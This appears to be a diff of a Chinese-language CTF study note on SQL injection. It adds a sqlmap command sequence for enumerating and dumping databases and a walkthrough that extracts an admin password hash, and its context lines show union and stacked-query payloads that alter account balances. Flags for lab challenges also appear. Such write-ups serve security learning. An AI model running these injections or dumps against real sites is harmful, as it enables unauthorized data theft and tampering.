@@ -19,6 +19,31 @@ tags:
 	- [Sqlmap基础用法、CTF实战及请求参数设置](https://blog.csdn.net/weixin_42529890/article/details/107238671)
 - [sql 注入技巧](https://bbs.kanxue.com/thread-262093.htm#msg_header_h1_1)
 
+```bash title="sqlmap 小连招"
+$ tmpurl="http://example.com/index.php?id=1"
+# 减少代码修改
+$ sqlmap -u $url --batch # ==> 存在注入漏洞
+
+$ sqlmap -u $tmpurl --batch --dbs
+available databases [5]
+
+$ sqlmap -u $tmpurl --batch --current-db # ==> 获得当前所在表名
+
+$ sqlmap -u $tmpurl --batch -D <db_name> --tables
+Database: <db_name>
+[2 tables]
+
+$ sqlmap -u $tmpurl --batch -D <db_name> -T <table_name> --columns
+Database: <db_name>
+Table: <table_name>
+[2 columns]
+
+$ sqlmap -u $tmpurl --batch -D <db_name> -T <table_name> -C <column_name> --dump
+
+# 暴力版本
+$ sqlmap -u $tmpurl --batch --smart --dump-all --output-dir="sqlog"
+```
+
 ## 实战
 
 ### [[SWPUCTF 2021 新生赛]easy_sql](https://www.nssctf.cn/problem/387)
@@ -140,7 +165,7 @@ nss=1'/**/uniunionon/**/select/**/1,database(), (select/**/group_concat(id,Secr3
 # Flag: NSS_db This is true flag: 1NSSCTF{790723af-49af-4b7e-803b-ba4f153de2f6}NSSCTF{I_d0nt_want_t0_w4ke_up}
 ```
 
-> [!flag]
+> [!flag]-
 >
 > NSSCTF{790723af-49af-4b7e-803b-ba4f153de2f6}
 
@@ -166,7 +191,7 @@ http://node4.anna.nssctf.cn:28589/buy/1';Update%09users%09Set%09balance=20000000
 # 此时发现自己的账户余额变为了 2e9（简单尝试下这也是最高数字了）；同理我们也可以调整商品价格，无论如何买下 flag 即可。
 ```
 
-> [!flag]
+> [!flag]-
 >
 > NSSCTF{7216a60b-9832-42c1-8188-86ff3e116300}
 
@@ -174,3 +199,68 @@ http://node4.anna.nssctf.cn:28589/buy/1';Update%09users%09Set%09balance=20000000
 >
 > 看题解，查看页面源码可以看到 `<!-- ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; -->` 分号提示应该和堆叠注入有关，这确实是没想到的……
 
+### [BUU SQL COURSE 1](https://buuoj.cn/challenges#BUU%20SQL%20COURSE%201)
+
+毋庸置疑，根据题目我们猜到这是一个 sql 注入题，问题来了，注入点在哪？
+
+首先我肯定是找 “登录” 进行注入，输入登录发现 url 没有变化，猜测是 POST 传参；抓个包看看，确实是有的，但是使用 hackbar 注入得到得只有 `{res:0}` ，尝试无果。
+
+点开其他新闻，发现 url 有变化，但是没有 `?` 代表的 get 传参，抓包看看，就发现了 `backend/content_detail.php?id=1`，注入点就来了，使用 sqlmap 有效，那就丝滑小连招
+
+```sh title="sql injection"
+
+$ sqlmap -u "http://b70c9764-ab56-4eb2-886b-87dd807bb3b9.node5.buuoj.cn:81/backend/content_detail.php?id=1" --batch
+
+$ --dbs
+available databases [6]:
+[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] news
+[*] performance_schema
+[*] test
+
+$ --current-db
+current database: 'news'
+
+# $ -D "ctftraining" --tables
+# Database: ctftraining
+# [3 tables]
+# +------------+
+# | FLAG_TABLE |
+# | news       |
+# | users      |
+# +------------+
+# 这里最后发现数据库为空，考虑到不是还有个登录界面吗？可能是尝试管理员登录
+
+$ -D "news" --tables
+[2 tables]
++----------+
+| admin    |
+| contents |
++----------+
+
+$ -D "news" -T "admin" --columns
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| password | varchar(128) |
+| username | varchar(128) |
++----------+--------------+
+
+$ -D "news" -T "admin" -C "id, password, username" --dump
+[1 entry]
++----+----------------------------------+----------+
+| id | password                         | username |
++----+----------------------------------+----------+
+| 1  | 3cd4b9fc8b66e6453b0ab13a78c3ea87 | admin    |
++----+----------------------------------+----------+
+```
+
+登录即可获得 flag：
+
+> [!flag]-
+>
+> flag{bb3ece96-3f0b-41f6-a0ef-ffac0ac5164b}
